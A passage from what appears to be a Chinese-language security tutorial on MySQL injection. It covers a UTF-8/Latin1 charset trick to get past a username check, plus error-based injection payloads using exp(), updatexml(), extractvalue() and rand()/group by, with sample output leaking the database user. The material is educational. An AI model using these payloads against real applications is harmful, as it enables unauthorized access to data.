<h6 id="我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。"><a href="#我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。" class="headerlink" title="我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。"></a>我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。</h6><h6 id="我们往表中添加一条数据：insert-table1-VALUES-1-39-admin-39-39-admin-39"><a href="#我们往表中添加一条数据：insert-table1-VALUES-1-39-admin-39-39-admin-39" class="headerlink" title="我们往表中添加一条数据：insert table1 VALUES(1,&#39;admin&#39;,&#39;admin&#39;);"></a>我们往表中添加一条数据：<code>insert table1 VALUES(1,&#39;admin&#39;,&#39;admin&#39;);</code></h6><h6 id="注意查看源代码："><a href="#注意查看源代码：" class="headerlink" title="注意查看源代码："></a>注意查看源代码：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You can't do this."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输入的内容进行addslashes处理，使得我们无法逃逸出单引号。"><a href="#我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输入的内容进行addslashes处理，使得我们无法逃逸出单引号。" class="headerlink" title="我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输入的内容进行addslashes处理，使得我们无法逃逸出单引号。"></a>我们对用户的输入进行了判断，若输入内容为<code>admin</code>，直接结束代码输出返回，并且还对输入的内容进行<code>addslashes</code>处理，使得我们无法逃逸出单引号。</h6><h6 id="这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？"><a href="#这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？" class="headerlink" title="这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？"></a>这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？</h6><h6 id="我们注意到：-mysqli-gt-query-quot-set-names-utf8-quot-这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。"><a href="#我们注意到：-mysqli-gt-query-quot-set-names-utf8-quot-这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。" class="headerlink" title="我们注意到：$mysqli-&gt;query(&quot;set names utf8&quot;);这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。"></a>我们注意到：<code>$mysqli-&gt;query(&quot;set names utf8&quot;);</code>这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。</h6><h6 id="上边在gbk宽字节注入的时候讲到过：set-names-utf8-相当于："><a href="#上边在gbk宽字节注入的时候讲到过：set-names-utf8-相当于：" class="headerlink" title="上边在gbk宽字节注入的时候讲到过：set names utf8;相当于："></a>上边在gbk宽字节注入的时候讲到过：<code>set names utf8;</code>相当于：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client =&apos;utf8&apos;;</span><br><span class="line">mysql&gt;SET character_set_results =&apos;utf8&apos;;</span><br><span class="line">mysql&gt;SET character_set_connection =&apos;utf8&apos;;</span><br></pre></td></tr></table></figure>

<h6 id="前边说道：PHP的编码是UTF-8，而我们现在设置的也是UTF-8，怎么会产生问题呢？"><a href="#前边说道：PHP的编码是UTF-8，而我们现在设置的也是UTF-8，怎么会产生问题呢？" class="headerlink" title="前边说道：PHP的编码是UTF-8，而我们现在设置的也是UTF-8，怎么会产生问题呢？"></a>前边说道：PHP的编码是<code>UTF-8</code>，而我们现在设置的也是<code>UTF-8</code>，怎么会产生问题呢？</h6><h6 id="前边我们提到：SQL语句会先转成character-set-client设置的编码。但，他接下来还会继续转换。character-set-client客户端层转换完毕之后，数据将会交给character-set-connection连接层处理，最后在从character-set-connection转到数据表的内部操作字符集。"><a href="#前边我们提到：SQL语句会先转成character-set-client设置的编码。但，他接下来还会继续转换。character-set-client客户端层转换完毕之后，数据将会交给character-set-connection连接层处理，最后在从character-set-connection转到数据表的内部操作字符集。" class="headerlink" title="前边我们提到：SQL语句会先转成character_set_client设置的编码。但，他接下来还会继续转换。character_set_client客户端层转换完毕之后，数据将会交给character_set_connection连接层处理，最后在从character_set_connection转到数据表的内部操作字符集。"></a>前边我们提到：SQL语句会先转成<code>character_set_client</code>设置的编码。但，他接下来还会继续转换。<code>character_set_client</code>客户端层转换完毕之后，数据将会交给<code>character_set_connection</code>连接层处理，最后在从<code>character_set_connection</code>转到数据表的内部操作字符集。</h6><h6 id="来本例中，字符集的转换为：UTF-8—-gt-UTF-8-gt-Latin1"><a href="#来本例中，字符集的转换为：UTF-8—-gt-UTF-8-gt-Latin1" class="headerlink" title="来本例中，字符集的转换为：UTF-8—&gt;UTF-8-&gt;Latin1"></a>来本例中，字符集的转换为：<code>UTF-8—&gt;UTF-8-&gt;Latin1</code></h6><h6 id="这里需要讲一下UTF-8编码的一些内容。"><a href="#这里需要讲一下UTF-8编码的一些内容。" class="headerlink" title="这里需要讲一下UTF-8编码的一些内容。"></a>这里需要讲一下UTF-8编码的一些内容。</h6><h6 id="UTF-8编码是变长编码，可能有1-4个字节表示："><a href="#UTF-8编码是变长编码，可能有1-4个字节表示：" class="headerlink" title="UTF-8编码是变长编码，可能有1~4个字节表示："></a>UTF-8编码是变长编码，可能有1~4个字节表示：</h6><h6 id="一字节时范围是-00-7F"><a href="#一字节时范围是-00-7F" class="headerlink" title="一字节时范围是[00-7F]"></a>一字节时范围是<code>[00-7F]</code></h6><h6 id="两字节时范围是-C0-DF-80-BF"><a href="#两字节时范围是-C0-DF-80-BF" class="headerlink" title="两字节时范围是[C0-DF][80-BF]"></a>两字节时范围是<code>[C0-DF][80-BF]</code></h6><h6 id="三字节时范围是-E0-EF-80-BF-80-BF"><a href="#三字节时范围是-E0-EF-80-BF-80-BF" class="headerlink" title="三字节时范围是[E0-EF][80-BF][80-BF]"></a>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code></h6><h6 id="四字节时范围是-F0-F7-80-BF-80-BF-80-BF"><a href="#四字节时范围是-F0-F7-80-BF-80-BF-80-BF" class="headerlink" title="四字节时范围是[F0-F7][80-BF][80-BF][80-BF]"></a>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></h6><h6 id="然后根据RFC-3629规范，又有一些字节值是不允许出现在UTF-8编码中的："><a href="#然后根据RFC-3629规范，又有一些字节值是不允许出现在UTF-8编码中的：" class="headerlink" title="然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的："></a>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-1.jpg" alt></p>
<h6 id="所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。"><a href="#所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。" class="headerlink" title="所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。"></a>所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</h6><h6 id="关于所有的UTF-8字符，你可以在这个表中一一看到：http-utf8-chartable-de-unicode-utf8-table-pl"><a href="#关于所有的UTF-8字符，你可以在这个表中一一看到：http-utf8-chartable-de-unicode-utf8-table-pl" class="headerlink" title="关于所有的UTF-8字符，你可以在这个表中一一看到：http://utf8-chartable.de/unicode-utf8-table.pl"></a>关于所有的UTF-8字符，你可以在这个表中一一看到：<a href="http://utf8-chartable.de/unicode-utf8-table.pl" target="_blank" rel="noopener">http://utf8-chartable.de/unicode-utf8-table.pl</a></h6><h6 id="引自：Mysql字符编码利用技巧"><a href="#引自：Mysql字符编码利用技巧" class="headerlink" title="引自：Mysql字符编码利用技巧"></a>引自：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">Mysql字符编码利用技巧</a></h6><h6 id="利用这一特性，我们输入：-username-admin-c2，-c2是一个Latin1字符集不存在的字符。"><a href="#利用这一特性，我们输入：-username-admin-c2，-c2是一个Latin1字符集不存在的字符。" class="headerlink" title="利用这一特性，我们输入：?username=admin%c2，%c2是一个Latin1字符集不存在的字符。"></a>利用这一特性，我们输入：<code>?username=admin%c2</code>，<code>%c2</code>是一个Latin1字符集不存在的字符。</h6><h6 id="由上述，可以简单的知道：-00-7F可以直接表示某个字符、-C2-F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。"><a href="#由上述，可以简单的知道：-00-7F可以直接表示某个字符、-C2-F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。" class="headerlink" title="由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。"></a>由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。</h6><h6 id="但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：00-7F、C2-EF。"><a href="#但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：00-7F、C2-EF。" class="headerlink" title="但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：00-7F、C2-EF。"></a>但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：<code>00-7F、C2-EF</code>。</h6><h6 id="而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。"><a href="#而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。" class="headerlink" title="而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。"></a>而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。</h6><h6 id="利用这一特性，我们的payload为-username-admin-c2，此处的-c2换为-c2-ef均可。"><a href="#利用这一特性，我们的payload为-username-admin-c2，此处的-c2换为-c2-ef均可。" class="headerlink" title="利用这一特性，我们的payload为?username=admin%c2，此处的%c2换为%c2-%ef均可。"></a>利用这一特性，我们的payload为<code>?username=admin%c2</code>，此处的<code>%c2</code>换为<code>%c2-%ef</code>均可。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `table1` WHERE username=&apos;admin&apos;</span><br></pre></td></tr></table></figure>

<h6 id="因为admin-c2在最后一层的内部操作字符集转换中变成admin。"><a href="#因为admin-c2在最后一层的内部操作字符集转换中变成admin。" class="headerlink" title="因为admin%c2在最后一层的内部操作字符集转换中变成admin。"></a>因为<code>admin%c2</code>在最后一层的内部操作字符集转换中变成<code>admin</code>。</h6><h4 id="0x06-报错注入原理"><a href="#0x06-报错注入原理" class="headerlink" title="0x06.报错注入原理"></a>0x06.报错注入原理</h4><h6 id="我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。"><a href="#我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。" class="headerlink" title="我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。"></a>我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。</h6><h6 id="那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。"><a href="#那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。" class="headerlink" title="那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。"></a>那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。</h6><h6 id="MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类："><a href="#MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：" class="headerlink" title="MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类："></a>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：</h6><ul>
<li>BigInt等数据类型溢出</li>
<li>函数参数格式错误</li>
<li>主键/字段重复</li>
</ul>
<h5 id="1-exp"><a href="#1-exp" class="headerlink" title="1.exp()"></a>1.exp()</h5><h6 id="函数语法：exp-int"><a href="#函数语法：exp-int" class="headerlink" title="函数语法：exp(int)"></a>函数语法：<code>exp(int)</code></h6><h6 id="适用版本：5-5-5-5-5-49"><a href="#适用版本：5-5-5-5-5-49" class="headerlink" title="适用版本：5.5.5~5.5.49"></a>适用版本：5.5.5~5.5.49</h6><h6 id="该函数将会返回e的x次方结果，例如："><a href="#该函数将会返回e的x次方结果，例如：" class="headerlink" title="该函数将会返回e的x次方结果，例如："></a>该函数将会返回e的x次方结果，例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(3);</span><br><span class="line">+--------------------+</span><br><span class="line">| exp(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<h6 id="为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。例如："><a href="#为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。例如：" class="headerlink" title="为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。例如："></a>为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(1000);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(1000)&apos;</span><br></pre></td></tr></table></figure>

<h6 id="我们的payload为：exp-select-from-select-user-a"><a href="#我们的payload为：exp-select-from-select-user-a" class="headerlink" title="我们的payload为：exp(~(select * from(select user())a))"></a>我们的payload为：<code>exp(~(select * from(select user())a))</code></h6><h6 id="其中，-符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。"><a href="#其中，-符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。" class="headerlink" title="其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。"></a>其中，<code>~</code>符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。</h6><h6 id="除了exp-之外，还有类似pow-之类的相似函数同样是可利用的，他们的原理相同。"><a href="#除了exp-之外，还有类似pow-之类的相似函数同样是可利用的，他们的原理相同。" class="headerlink" title="除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。"></a>除了<code>exp()</code>之外，还有类似<code>pow()</code>之类的相似函数同样是可利用的，他们的原理相同。</h6><h5 id="2-updatexml"><a href="#2-updatexml" class="headerlink" title="2.updatexml()"></a>2.updatexml()</h5><h6 id="函数语法：updatexml-XML-document-XPath-string-new-value"><a href="#函数语法：updatexml-XML-document-XPath-string-new-value" class="headerlink" title="函数语法：updatexml(XML_document, XPath_string, new_value);"></a>函数语法：<code>updatexml(XML_document, XPath_string, new_value);</code></h6><h6 id="适用版本-5-1-5"><a href="#适用版本-5-1-5" class="headerlink" title="适用版本: 5.1.5+"></a>适用版本: 5.1.5+</h6><h6 id="我们通常在第二个xpath参数填写我们要查询的内容。"><a href="#我们通常在第二个xpath参数填写我们要查询的内容。" class="headerlink" title="我们通常在第二个xpath参数填写我们要查询的内容。"></a>我们通常在第二个xpath参数填写我们要查询的内容。</h6><h6 id="与exp-不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。"><a href="#与exp-不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。" class="headerlink" title="与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。"></a>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</h6><h6 id="payload-updatexml-1-concat-0x7e-select-user-0x7e-1"><a href="#payload-updatexml-1-concat-0x7e-select-user-0x7e-1" class="headerlink" title="payload: updatexml(1,concat(0x7e,(select user()),0x7e),1)"></a>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></h6><h6 id="前后添加-0x7e-使其不符合xpath格式从而报错。例如："><a href="#前后添加-0x7e-使其不符合xpath格式从而报错。例如：" class="headerlink" title="前后添加~(0x7e)使其不符合xpath格式从而报错。例如："></a>前后添加<code>~</code>(0x7e)使其不符合<code>xpath</code>格式从而报错。例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure>

<h5 id="3-extractvalue"><a href="#3-extractvalue" class="headerlink" title="3.extractvalue()"></a>3.extractvalue()</h5><h6 id="函数语法：EXTRACTVALUE-XML-document-XPath-string"><a href="#函数语法：EXTRACTVALUE-XML-document-XPath-string" class="headerlink" title="函数语法：EXTRACTVALUE (XML_document, XPath_string);"></a>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></h6><h6 id="适用版本：5-1-5"><a href="#适用版本：5-1-5" class="headerlink" title="适用版本：5.1.5+"></a>适用版本：5.1.5+</h6><h6 id="利用原理与updatexml函数相同"><a href="#利用原理与updatexml函数相同" class="headerlink" title="利用原理与updatexml函数相同"></a>利用原理与updatexml函数相同</h6><h6 id="payload-and-extractvalue-1-concat-0x7e-select-user-0x7e"><a href="#payload-and-extractvalue-1-concat-0x7e-select-user-0x7e" class="headerlink" title="payload: and (extractvalue(1,concat(0x7e,(select user()),0x7e)))"></a>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></h6><h6 id="例如：-5"><a href="#例如：-5" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure>

<h5 id="4-rand-group-count"><a href="#4-rand-group-count" class="headerlink" title="4.rand()+group()+count()"></a>4.rand()+group()+count()</h5><h6 id="虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故rand-不能后接在order-group-by上。"><a href="#虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故rand-不能后接在order-group-by上。" class="headerlink" title="虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故rand()不能后接在order/group by上。"></a>虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故<code>rand()</code>不能后接在<code>order/group by</code>上。</h6><h6 id="举一个例子：假设user表有三条数据，我们通过：select-from-user-group-by-username来通过其中的username字段进行分组。"><a href="#举一个例子：假设user表有三条数据，我们通过：select-from-user-group-by-username来通过其中的username字段进行分组。" class="headerlink" title="举一个例子：假设user表有三条数据，我们通过：select * from user group by username来通过其中的username字段进行分组。"></a>举一个例子：假设user表有三条数据，我们通过：<code>select * from user group by username</code>来通过其中的username字段进行分组。</h6><h6 id="此过程会先建立一个虚拟表，存在两个字段：key，count"><a href="#此过程会先建立一个虚拟表，存在两个字段：key，count" class="headerlink" title="此过程会先建立一个虚拟表，存在两个字段：key，count"></a>此过程会先建立一个虚拟表，存在两个字段：<code>key，count</code></h6><h6 id="其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：username-test-amp-password-test"><a href="#其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：username-test-amp-password-test" class="headerlink" title="其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：username=test&amp;password=test"></a>其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：<code>username=test&amp;password=test</code></h6><h6 id="username为test出现一次，则现在虚表内查询是否存在test，若存在，则count-1，若不存在，则添加test，其count为1。"><a href="#username为test出现一次，则现在虚表内查询是否存在test，若存在，则count-1，若不存在，则添加test，其count为1。" class="headerlink" title="username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。"></a>username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。</h6><h6 id="对于floor-rand-0-2-，其中rand-函数，会生成0-1之间随机一个小数、floor-取整数部分、0是随机因子、乘2是为了让大于0-5的小数通过floor函数得1，否则永远为0。"><a href="#对于floor-rand-0-2-，其中rand-函数，会生成0-1之间随机一个小数、floor-取整数部分、0是随机因子、乘2是为了让大于0-5的小数通过floor函数得1，否则永远为0。" class="headerlink" title="对于floor(rand(0)*2)，其中rand()函数，会生成0~1之间随机一个小数、floor()取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。"></a>对于<code>floor(rand(0)*2)</code>，其中<code>rand()</code>函数，会生成0~1之间随机一个小数、<code>floor()</code>取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。</h6><h6 id="若表中有三行数据：我们通过select-from-user-group-by-floor-rand-0-2-进行排序的话。"><a href="#若表中有三行数据：我们通过select-from-user-group-by-floor-rand-0-2-进行排序的话。" class="headerlink" title="若表中有三行数据：我们通过select * from user group by floor(rand(0)*2)进行排序的话。"></a>若表中有三行数据：我们通过<code>select * from user group by floor(rand(0)*2)</code>进行排序的话。</h6><h6 id="注意，由于rand-0-的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…"><a href="#注意，由于rand-0-的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…" class="headerlink" title="注意，由于rand(0)的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…"></a>注意，由于<code>rand(0)</code>的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…</h6><h6 id="首先group-by需要执行的话，需要确定分组因子，故floor-rand-0-2-被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：floor-rand-0-2-第二次被执行，得到结果1，故虚表插入的内容为key-1-amp-count-1。"><a href="#首先group-by需要执行的话，需要确定分组因子，故floor-rand-0-2-被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：floor-rand-0-2-第二次被执行，得到结果1，故虚表插入的内容为key-1-amp-count-1。" class="headerlink" title="首先group by需要执行的话，需要确定分组因子，故floor(rand(0)*2)被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：floor(rand(0)*2)第二次被执行，得到结果1，故虚表插入的内容为key=1&amp;count=1。"></a>首先<code>group by</code>需要执行的话，需要确定分组因子，故<code>floor(rand(0)*2)</code>被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：<code>floor(rand(0)*2)</code>第二次被执行，得到结果1，故虚表插入的内容为<code>key=1&amp;count=1</code>。</h6><h6 id="第二次执行group-by时：floor-rand-0-2-先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key-1的count加一即可，floor-只运行了一次。"><a href="#第二次执行group-by时：floor-rand-0-2-先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key-1的count加一即可，floor-只运行了一次。" class="headerlink" title="第二次执行group by时：floor(rand(0)*2)先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。"></a>第二次执行group by时：<code>floor(rand(0)*2)</code>先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。</h6><h6 id="第三次执行group-by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor-…-被执行第五次，得到结果1，故此时虚表将插入的值为key-1-amp-count-1，注意，此时虚表已有一条记录为：key-1-amp-count-2，并且字段key为主键，具有不可重复性，故虚表在尝试插入时将产生错误。"><a href="#第三次执行group-by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor-…-被执行第五次，得到结果1，故此时虚表将插入的值为key-1-amp-count-1，注意，此时虚表已有一条记录为：key-1-amp-count-2，并且字段key为主键，具有不可重复性，故虚表在尝试插入时将产生错误。" class="headerlink" title="第三次执行group by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为key=1&amp;count=1，注意，此时虚表已有一条记录为：key=1&amp;count=2，并且字段key为主键，具有不可重复性，故虚表在尝试插入时将产生错误。"></a>第三次执行group by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为<code>key=1&amp;count=1</code>，注意，此时虚表已有一条记录为：<code>key=1&amp;count=2</code>，并且字段key为主键，具有不可重复性，故虚表在尝试插入时将产生错误。</h6><h6 id="图文如下："><a href="#图文如下：" class="headerlink" title="图文如下："></a>图文如下：</h6><h6 id="1-查询前默认会建立空虚拟表如下图"><a href="#1-查询前默认会建立空虚拟表如下图" class="headerlink" title="1.查询前默认会建立空虚拟表如下图:"></a>1.查询前默认会建立空虚拟表如下图:</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-2.jpg" alt></p>
<h6 id="2-取第一条记录，执行floor-rand-0-2-，发现结果为0-第一次计算-查询虚拟表，发现0的键值不存在，则floor-rand-0-2-会被再计算一次，结果为1-第二次计算-，插入虚表，这时第一条记录查询完毕，如下图"><a href="#2-取第一条记录，执行floor-rand-0-2-，发现结果为0-第一次计算-查询虚拟表，发现0的键值不存在，则floor-rand-0-2-会被再计算一次，结果为1-第二次计算-，插入虚表，这时第一条记录查询完毕，如下图" class="headerlink" title="2.取第一条记录，执行floor(rand(0)2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:"></a>2.取第一条记录，执行floor(rand(0)2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-3.jpg" alt></p>
<h6 id="3-查询第二条记录，再次计算floor-rand-0-2-，发现结果为1-第三次计算-，查询虚表，发现1的键值存在，所以floor-rand-0-2-不会被计算第二次，直接count-加1，第二条记录查询完毕，结果如下"><a href="#3-查询第二条记录，再次计算floor-rand-0-2-，发现结果为1-第三次计算-，查询虚表，发现1的键值存在，所以floor-rand-0-2-不会被计算第二次，直接count-加1，第二条记录查询完毕，结果如下" class="headerlink" title="3.查询第二条记录，再次计算floor(rand(0)2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:"></a>3.查询第二条记录，再次计算floor(rand(0)2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-4.jpg" alt></p>
